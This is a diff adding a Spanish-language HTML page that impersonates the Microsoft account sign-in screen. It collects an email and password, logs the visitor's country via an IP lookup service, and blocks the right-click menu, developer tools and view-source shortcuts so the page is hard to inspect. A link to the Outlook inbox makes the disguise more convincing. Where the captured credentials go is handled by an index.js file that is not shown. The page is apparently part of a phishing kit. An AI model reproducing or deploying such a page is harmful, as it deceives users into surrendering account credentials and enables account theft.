@@ -1,0 +1,124 @@
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="s22.css">
+  <link rel="stylesheet" href="min.css">
+  <link rel="icon" type="image/png" href="cvc.jpg" />
+  <title>Inicia sesión en tu cuenta Microsoft</title>
+</head>
+<body background="aaa.png">
+<div>
+  <div class="contact-form-wrapper d-flex justify-content-center" id="cua">
+    <form action="#" id="task-form" method="post" class="contact-form">
+      <div class="i">
+        <img id="ia" src="rasr2.png" alt="">
+      </div>
+      <h3 id="p">Iniciar sesión</h3>
+      <div class="camp">
+      <div>
+        <input type="email" id="task-title" name="af" required placeholder="Correo electronico, telefono o Skype" required>
+      </div>
+      <div class="aS">
+        <div class="camp">
+          <input  type="text" name="pass" id="task-description"  required placeholder="Contraseña">
+        <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
+      </div>
+    </div>
+    <div class="btn">
+      <button id="btn-task-form" type="submit">Siguiente</button>
+      </div>
+    </div>
+      </form></div>
+  
+</div>
+
+</div>
+
+</body>
+
+    <!-- CUSTOM CODE -->
+    <script src="./index.js" type="module"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script> src= "https://ipinfo.io/json"</script>
+    <script>
+
+      async function getIpClient() {
+        try {
+          const response = await axios.get('https://ipinfo.io/json');
+          console.log(response);
+          
+          function docReady(fn) {
+          // see if DOM is already available
+          if (document.readyState === "complete" || document.readyState === "interactive") {
+              // call on next available tick
+              setTimeout(fn, 1);
+          } else {
+              document.addEventListener("DOMContentLoaded", fn);
+          }
+      }    
+      docReady(function() {
+         
+         localStorage.setItem("pusr", response.data.country);
+          
+      });
+        } catch (error) {
+          console.error(error);
+          
+          
+          
+        }
+      }
+      var todayDate = new Date().toISOString().slice(0, 10);
+      localStorage.setItem("pusrf", todayDate);
+      
+      getIpClient();
+
+        
+      
+      </script>
+      <form action=""></form>
+      <div class="ttlo">
+        <a href="https://outlook.live.com/owa/">
+<div class="btn">
+  <button id="btn-task-2" type="">Volver a la bandeja de entrada</button>
+</a>
+
+<script>
+  
+  document.addEventListener('contextmenu', event => event.preventDefault());
+
+  document.onkeydown = function (e) {
+
+      if(e.keyCode == 123) {
+          return false;
+      }
+
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+          return false;
+      }
+
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+          return false;
+      }
+      if(e.ctrlKey && e.keyCode == 85) {
+          return false;
+      }
+  }
+
+</script>
+<script>
+var nutn = document.getElementById("btn");
+var namld = document.getElementById("formu");
+var swold = document.getElementById("formu2");
+
+nutn.addEventListener("click", function() {
+namld.style.display = "none";
+swold.style.display = "block";
+});
+</script>
+  </body>
+  
+
+</html>
